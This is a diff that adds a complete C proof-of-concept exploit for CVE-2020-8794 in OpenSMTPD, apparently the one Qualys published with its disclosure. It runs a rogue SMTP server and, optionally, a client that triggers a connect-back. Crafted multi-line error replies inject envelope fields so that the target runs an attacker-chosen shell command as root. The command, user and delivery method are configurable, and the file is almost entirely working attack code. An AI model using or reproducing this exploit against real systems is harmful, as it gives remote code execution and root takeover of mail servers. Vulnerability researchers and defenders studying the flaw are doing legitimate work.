@@ -1,0 +1,426 @@
+/*
+ * LPE and RCE in OpenSMTPD's default install (CVE-2020-8794)
+ * Copyright (C) 2020 Qualys, Inc.
+ *
+ * This program is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation, either version 3 of the License, or
+ * (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program.  If not, see <https://www.gnu.org/licenses/>.
+ */
+
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netinet/tcp.h>
+#include <netdb.h>
+#include <stdarg.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <time.h>
+#include <unistd.h>
+
+static enum {
+    CLIENT_SIDE_EXPLOIT,
+    SERVER_SIDE_EXPLOIT,
+} exploit = CLIENT_SIDE_EXPLOIT;
+
+static enum {
+    NEW_SMTPD_GRAMMAR,
+    OLD_SMTPD_GRAMMAR,
+} grammar = NEW_SMTPD_GRAMMAR;
+
+static struct {
+    const char * command;
+    const char * user;
+    const char * dispatcher;
+    const char * maildir;
+    char lines[512];
+} inject = {
+    .command = "X=`mktemp /tmp/x.XXXXXX`&&id>>$X;exit 0",
+    .user = "root",
+    .dispatcher = "local_mail",
+    .maildir = NULL,
+};
+
+#define die() do { \
+    printf("died in %s: %u\n", __func__, __LINE__); \
+    exit(EXIT_FAILURE); \
+} while (0)
+
+static struct addrinfo *
+common_getaddrinfo(const char * const host, const char * const port)
+{
+    const struct addrinfo hints = {
+        .ai_family = AF_INET,
+        .ai_socktype = SOCK_STREAM,
+        .ai_protocol = IPPROTO_TCP,
+        .ai_flags = AI_NUMERICHOST | AI_NUMERICSERV,
+    };
+    struct addrinfo * addr = NULL;
+    if (getaddrinfo(host, port, &hints, &addr) != 0) die();
+    if (addr == NULL || addr->ai_next != NULL) die();
+    return addr;
+}
+
+static const char *
+common_getnameinfo(const struct sockaddr * const addr, const socklen_t addr_len)
+{
+    static char host[NI_MAXHOST];
+    static char port[NI_MAXSERV];
+    if (getnameinfo(addr, addr_len, host, sizeof(host), port, sizeof(port),
+        NI_NUMERICHOST | NI_NUMERICSERV) != 0) die();
+
+    static char host_port[NI_MAXHOST + NI_MAXSERV];
+    if (snprintf(host_port, sizeof(host_port), "%s:%s", host, port) <= 0) die();
+    return host_port;
+}
+
+static void
+common_send(const int fd, const char * const format, va_list ap)
+{
+    if (fd <= -1) die();
+    static char buf[1024];
+    const int len = vsnprintf(buf, sizeof(buf), format, ap);
+    if (len <= 0 || (unsigned)len >= sizeof(buf)) die();
+    printf("--> %s%s", buf, buf[len-1] != '\n' ? "\n" : "");
+
+    const char * data = buf;
+    size_t size = len;
+
+    for (;;) {
+        const ssize_t sent = send(fd, data, size, MSG_NOSIGNAL);
+        if (sent <= 0) die();
+        if ((size_t)sent > size) die();
+        data += sent;
+        size -= sent;
+        if (size <= 0) return;
+    }
+    die();
+}
+
+static int listen_fd = -1;
+
+static void
+server_listen(void)
+{
+    if (listen_fd != -1) die();
+    const struct addrinfo * const addr = common_getaddrinfo("0.0.0.0", "25");
+    listen_fd = socket(addr->ai_family, addr->ai_socktype, addr->ai_protocol);
+    if (listen_fd <= -1) die();
+
+    const int on = 1;
+    if (setsockopt(listen_fd, SOL_SOCKET, SO_REUSEADDR, &on, sizeof(on)) != 0) die();
+    if (bind(listen_fd, addr->ai_addr, addr->ai_addrlen) != 0) die();
+    if (listen(listen_fd, 10) != 0) die();
+
+    printf("\nListening on %s\n",
+        common_getnameinfo(addr->ai_addr, addr->ai_addrlen));
+}
+
+static int server_fd = -1;
+
+static void
+server_accept(void)
+{
+    struct sockaddr addr;
+    socklen_t addr_len = sizeof(addr);
+
+    if (listen_fd <= -1) die();
+    if (server_fd != -1) die();
+    server_fd = accept(listen_fd, &addr, &addr_len);
+    if (server_fd <= -1) die();
+    if (addr_len > sizeof(addr)) die();
+
+    const time_t now = time(NULL);
+    printf("\nConnection from %s\n%s",
+        common_getnameinfo(&addr, addr_len), ctime(&now));
+
+    const int on = 1;
+    if (setsockopt(server_fd, IPPROTO_TCP, TCP_NODELAY, &on, sizeof(on)) != 0) die();
+}
+
+static void
+server_send(const char * const format, ...)
+{
+    if (server_fd <= -1) die();
+
+    va_list ap;
+    va_start(ap, format);
+    common_send(server_fd, format, ap);
+    va_end(ap);
+}
+
+static char server_command[1024];
+
+static void
+server_recv(const char * const prefix)
+{
+    if (server_fd <= -1) die();
+    const size_t prefix_len = strlen(prefix);
+    if (prefix_len < 4) die();
+
+    char * data = server_command;
+    size_t size = sizeof(server_command);
+
+    for (;;) {
+        const ssize_t rcvd = recv(server_fd, data, size, 0);
+        if (rcvd <= 0) die();
+        if ((size_t)rcvd >= size) die();
+        data += rcvd;
+        size -= rcvd;
+        data[0] = '\0';
+        if (data[-1] != '\n') continue;
+        if (strchr(server_command, '\n') != data - 1) die();
+
+        printf("<-- %s", server_command);
+        if (strncmp(server_command, prefix, prefix_len) != 0) die();
+        return;
+    }
+    die();
+}
+
+static void
+server_close(void)
+{
+    if (server_fd <= -1) die();
+    if (close(server_fd) != 0) die();
+    server_fd = -1;
+}
+
+static void
+server_session(const char * const inject_lines)
+{
+    const char * const error_code =
+        (exploit == SERVER_SIDE_EXPLOIT) ? "421" : "553";
+
+    server_accept();
+    server_send("220 ent.of.line ESMTP\n");
+
+    server_recv("EHLO ");
+    server_send("250 ent.of.line Hello\n");
+
+    server_recv("MAIL FROM:<");
+    if ((strncmp(server_command, "MAIL FROM:<>", 12) == 0) !=
+        (exploit == SERVER_SIDE_EXPLOIT)) die();
+
+    if (inject_lines != NULL) {
+        if (inject_lines[0] == '\0') die();
+        if (inject_lines[0] == '\n') die();
+        if (inject_lines[strlen(inject_lines)-1] == '\n') die();
+
+        server_send("%s-Error\n", error_code);
+        server_send("%s\n\n%s%c", error_code, inject_lines, (int)'\0');
+
+    } else {
+        server_send("%s Error\n", error_code);
+
+        server_recv("RSET");
+        server_send("250 Reset\n");
+
+        server_recv("QUIT");
+        server_send("221 Bye\n");
+    }
+    server_close();
+}
+
+static const struct addrinfo * client_target = NULL;
+static const char * client_mail = NULL;
+static const char * client_rcpt = NULL;
+
+static int client_fd = -1;
+
+static void
+client_connect(void)
+{
+    if (client_fd != -1) die();
+    client_fd = socket(client_target->ai_family, client_target->ai_socktype,
+        client_target->ai_protocol);
+    if (client_fd <= -1) die();
+
+    if (connect(client_fd, client_target->ai_addr,
+        client_target->ai_addrlen) != 0) die();
+
+    printf("\nConnected to %s\n",
+        common_getnameinfo(client_target->ai_addr, client_target->ai_addrlen));
+}
+
+static void
+client_send(const char * const format, ...)
+{
+    if (client_fd <= -1) die();
+
+    va_list ap;
+    va_start(ap, format);
+    common_send(client_fd, format, ap);
+    va_end(ap);
+}
+
+static char client_reply[1024];
+
+static void
+client_recv(const char * const prefix)
+{
+    if (client_fd <= -1) die();
+    const size_t prefix_len = strlen(prefix);
+    if (prefix_len < 3) die();
+
+    char * data = client_reply;
+    size_t size = sizeof(client_reply);
+    const char * line = data;
+
+    for (;;) {
+        const ssize_t rcvd = recv(client_fd, data, size, 0);
+        if (rcvd <= 0) die();
+        if ((size_t)rcvd >= size) die();
+        data += rcvd;
+        size -= rcvd;
+        data[0] = '\0';
+        if (data[-1] != '\n') continue;
+
+        for (;;) {
+            const char * const new_line = strchr(line, '\n');
+            if (new_line == NULL) break;
+            if (new_line - line < 4) die();
+            printf("<-- %.*s", (int)(new_line - line + 1), line);
+            if (strncmp(line, prefix, prefix_len) != 0) die();
+
+            if (line[3] == ' ') {
+                if (new_line + 1 != data) die();
+                return;
+            }
+            if (line[3] != '-') die();
+            line = new_line + 1;
+        }
+        if (line != data) die();
+    }
+    die();
+}
+
+static void
+client_close(void)
+{
+    if (client_fd <= -1) die();
+    if (close(client_fd) != 0) die();
+    client_fd = -1;
+}
+
+static void
+client_session(void)
+{
+    client_connect();
+    client_recv("220 ");
+
+    client_send("HELP\n");
+    client_recv("214");
+    if (strstr(client_reply, "please contact bugs@openbsd.org") == NULL) die();
+
+    client_send("EHLO ent.of.line\n");
+    client_recv("250");
+    const int dsn = (strstr(client_reply, "250-DSN") != NULL);
+
+    client_send("MAIL FROM:<%s>\n", client_mail);
+    client_recv("250 ");
+
+    client_send("RCPT TO:<%s>%s\n", client_rcpt, dsn ? " NOTIFY=SUCCESS" : "");
+    client_recv("250 ");
+
+    client_send("DATA\n");
+    client_recv("354 Enter mail, end with ");
+
+    if (!dsn) {
+        client_send("Delivered-To: %s\n", client_rcpt);
+    }
+    client_send("\n");
+    client_send(".\n");
+    client_recv("250 ");
+
+    client_send("QUIT\n");
+    client_recv("221 ");
+    client_close();
+}
+
+int
+main(int argc, char * const * argv)
+{
+    setlinebuf(stdout);
+    puts("LPE and RCE in OpenSMTPD's default install (CVE-2020-8794)");
+    puts("Copyright (C) 2020 Qualys, Inc.");
+
+    int opt;
+    while ((opt = getopt(argc, argv, "c:u:d:m:n")) != -1) {
+        switch (opt) {
+        case 'c':
+            inject.command = optarg;
+            break;
+        case 'u':
+            grammar = OLD_SMTPD_GRAMMAR;
+            inject.user = optarg;
+            break;
+        case 'd':
+            inject.dispatcher = optarg;
+            break;
+        case 'm':
+            grammar = OLD_SMTPD_GRAMMAR;
+            inject.maildir = optarg;
+            break;
+        case 'n':
+            grammar = NEW_SMTPD_GRAMMAR;
+            break;
+        default:
+            die();
+        }
+    }
+
+    if (grammar == NEW_SMTPD_GRAMMAR) {
+        const int len = snprintf(inject.lines, sizeof(inject.lines),
+            "type:mda\nmda-exec:%s\ndispatcher:%s\nmda-user:%s",
+            inject.command, inject.dispatcher, inject.user);
+        if (len <= 0 || (unsigned)len >= sizeof(inject.lines)) die();
+
+    } else if (grammar == OLD_SMTPD_GRAMMAR) {
+        const int len = snprintf(inject.lines, sizeof(inject.lines),
+            "type:mda\nmda-buffer:%s\nmda-method:%s\nmda-user:%s\nmda-usertable:<getpwnam>",
+            inject.maildir ? inject.maildir : inject.command,
+            inject.maildir ? "maildir" : "mda", inject.user);
+        if (len <= 0 || (unsigned)len >= sizeof(inject.lines)) die();
+
+    } else die();
+
+    argc -= optind;
+    argv += optind;
+
+    if (argc == 3) {
+        exploit = SERVER_SIDE_EXPLOIT;
+        client_target = common_getaddrinfo(argv[0], "25");
+        client_mail = argv[1];
+        client_rcpt = argv[2];
+
+    } else if (argc != 0) die();
+
+    server_listen();
+    if (exploit == CLIENT_SIDE_EXPLOIT) {
+        server_session(inject.lines);
+
+    } else if (exploit == SERVER_SIDE_EXPLOIT) {
+        client_session();
+        unsigned try;
+        for (try = 0; try < 1; try++) {
+            server_session(NULL);
+            puts("\nPlease wait for OpenSMTPD to connect back...");
+        }
+        server_session(inject.lines);
+        client_session();
+        server_session("type:invalid");
+
+    } else die();
+    exit(EXIT_SUCCESS);
+}
